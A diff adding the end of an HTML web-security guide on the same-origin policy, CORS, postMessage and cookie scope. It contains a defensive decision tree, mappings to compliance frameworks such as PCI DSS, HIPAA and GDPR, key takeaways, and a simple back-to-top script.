+│         Attacker Website (attacker.com)           │
+│                                                   │
+│   [Malicious JavaScript]                          │
+│          ↓                                        │
+└──────────┼────────────────────────────────────────┘
+           │
+           ↓
+┌──────────┴────────────────────────────────────────┐
+│              Browser SOP Layer                    │
+│                                                   │
+│  ❌ Direct DOM Access → BLOCKED                   │
+│  ❌ Direct Cookie Read → BLOCKED                  │
+│  ❌ Unauthenticated XHR → BLOCKED                 │
+│                                                   │
+│  ✅ CORS Request → Check Server Response          │
+│  ✅ postMessage → Receiver Validates              │
+│                                                   │
+└───────────────────────────────────────────────────┘
+           ↓
+┌──────────┴────────────────────────────────────────┐
+│         Target Server (api.example.com)           │
+│                                                   │
+│  CORS Headers Present?                            │
+│    ├─ Yes, origin allowed → ✅ Allow              │
+│    └─ No / wrong origin → ❌ Block                │
+│                                                   │
+└───────────────────────────────────────────────────┘
+            </div>
+
+            <h3>Decision Tree: Which Mechanism?</h3>
+            <div class="flow-diagram">
+Need cross-origin interaction?
+    ↓
+    ├─ API calls, resource loading?
+    │   └─→ Use CORS
+    │       • Server adds headers
+    │       • Explicit allowlist
+    │
+    ├─ Communication between windows/iframes?
+    │   └─→ Use postMessage
+    │       • Both sides validate origin
+    │       • Message-based protocol
+    │
+    ├─ Share sessions across subdomains?
+    │   └─→ Subdomain Cookies
+    │       • Set Domain=.example.com
+    │       • Use SameSite attribute
+    │       • Monitor subdomain security
+    │
+    └─ Legacy subdomain DOM access?
+        └─→ MIGRATE to postMessage
+            • Never use document.domain
+            • Deprecated and dangerous
+            </div>
+
+            <h2 id="compliance">10. Compliance Mapping</h2>
+
+            <div class="compliance-grid">
+                <div class="compliance-card">
+                    <h4>🔒 ISO/IEC 27001:2022</h4>
+                    <p><strong>A.8.23</strong> - Web filtering</p>
+                    <p>Implement CORS policies to control which origins can access organizational resources</p>
+                    <p><strong>A.8.24</strong> - Use of cryptography</p>
+                    <p>Ensure cookies use Secure attribute, enforce HTTPS for cross-origin communication</p>
+                </div>
+
+                <div class="compliance-card">
+                    <h4>🏛️ NIST SP 800-53 Rev.5</h4>
+                    <p><strong>AC-3</strong> - Access Enforcement</p>
+                    <p>CORS allowlists enforce approved cross-origin access patterns</p>
+                    <p><strong>SC-8</strong> - Transmission Confidentiality</p>
+                    <p>Require Secure attribute on cookies, TLS for cross-origin requests</p>
+                    <p><strong>SI-10</strong> - Information Input Validation</p>
+                    <p>Validate event.origin in postMessage handlers, sanitize message data</p>
+                </div>
+
+                <div class="compliance-card">
+                    <h4>💳 PCI DSS v4.0</h4>
+                    <p><strong>6.4.1</strong> - Secure development</p>
+                    <p>Implement secure CORS configurations, avoid origin reflection vulnerabilities</p>
+                    <p><strong>6.4.2</strong> - Common coding vulnerabilities</p>
+                    <p>Prevent CORS misconfigurations that could expose cardholder data</p>
+                    <p><strong>4.2.1</strong> - Strong cryptography</p>
+                    <p>Use Secure flag on all cookies containing sensitive data</p>
+                </div>
+
+                <div class="compliance-card">
+                    <h4>🏥 HIPAA Security Rule</h4>
+                    <p><strong>§164.312(a)(1)</strong> - Access Control</p>
+                    <p>CORS policies control which applications can access ePHI via APIs</p>
+                    <p><strong>§164.312(e)(1)</strong> - Transmission Security</p>
+                    <p>Enforce HTTPS with Secure cookies for ePHI transmission across origins</p>
+                </div>
+
+                <div class="compliance-card">
+                    <h4>🇪🇺 GDPR</h4>
+                    <p><strong>Article 25</strong> - Data protection by design</p>
+                    <p>Implement secure cross-origin patterns to prevent unauthorized personal data access</p>
+                    <p><strong>Article 32</strong> - Security of processing</p>
+                    <p>Use appropriate technical measures (strict CORS, SameSite cookies) to secure personal data</p>
+                </div>
+
+                <div class="compliance-card">
+                    <h4>📊 SOC 2 Type II</h4>
+                    <p><strong>CC6.1</strong> - Logical access controls</p>
+                    <p>Document CORS policies, maintain allowlist of approved origins</p>
+                    <p><strong>CC6.6</strong> - Transmission protection</p>
+                    <p>Enforce Secure flag on cookies, use HTTPS for cross-origin communication</p>
+                    <p><strong>CC7.1</strong> - Security monitoring</p>
+                    <p>Log and monitor CORS policy violations, unauthorized origins</p>
+                </div>
+            </div>
+
+            <h3>Implementation Guidance by Framework</h3>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Framework</th>
+                        <th>Primary Controls</th>
+                        <th>Key Requirements</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>NIST CSF</td>
+                        <td>PR.AC-4, PR.DS-5</td>
+                        <td>Implement least privilege CORS policies, encrypt transmission</td>
+                    </tr>
+                    <tr>
+                        <td>ISO 27001</td>
+                        <td>A.8.23, A.8.24</td>
+                        <td>Web filtering controls, cryptographic controls for cookies</td>
+                    </tr>
+                    <tr>
+                        <td>PCI DSS</td>
+                        <td>6.4.1, 6.4.2, 4.2.1</td>
+                        <td>Secure coding practices, prevent common vulnerabilities</td>
+                    </tr>
+                    <tr>
+                        <td>HIPAA</td>
+                        <td>§164.312(a)(1), (e)(1)</td>
+                        <td>Access controls, transmission security for ePHI</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="warning-box">
+                <h4>⚠️ Audit Evidence Requirements</h4>
+                <ul>
+                    <li><strong>Documentation:</strong> Maintain list of approved origins, CORS policy rationale</li>
+                    <li><strong>Code Reviews:</strong> Review CORS configurations, postMessage implementations</li>
+                    <li><strong>Testing:</strong> Penetration tests for CORS misconfigurations, origin validation</li>
+                    <li><strong>Monitoring:</strong> Log rejected cross-origin requests, alert on anomalies</li>
+                </ul>
+            </div>
+
+            <div style="text-align: center; padding: 3rem 1rem; background: #f8f9fa; margin-top: 3rem;">
+                <h3 style="color: #667eea; margin-bottom: 1rem;">🎯 Key Takeaways</h3>
+                <ul style="text-align: left; max-width: 700px; margin: 0 auto;">
+                    <li><strong>CORS</strong> is the modern standard - use explicit allowlists, never reflect origins</li>
+                    <li><strong>postMessage</strong> requires validation on BOTH sides - always check event.origin</li>
+                    <li><strong>document.domain</strong> is deprecated and dangerous - migrate to postMessage</li>
+                    <li><strong>Cookie scope</strong> matters - narrow Domain attribute, use SameSite</li>
+                    <li><strong>Compliance</strong> requires documentation, testing, and monitoring</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <a href="#" class="back-to-top" id="backToTop">↑</a>
+
+    <script>
+        // Back to top button
+        const backToTop = document.getElementById('backToTop');
+        
+        window.addEventListener('scroll', () => {
+            if (window.pageYOffset > 300) {
+                backToTop.classList.add('visible');
+            } else {
+                backToTop.classList.remove('visible');
+            }
+        });
+        
+        backToTop.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+        
+        // Smooth scroll for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
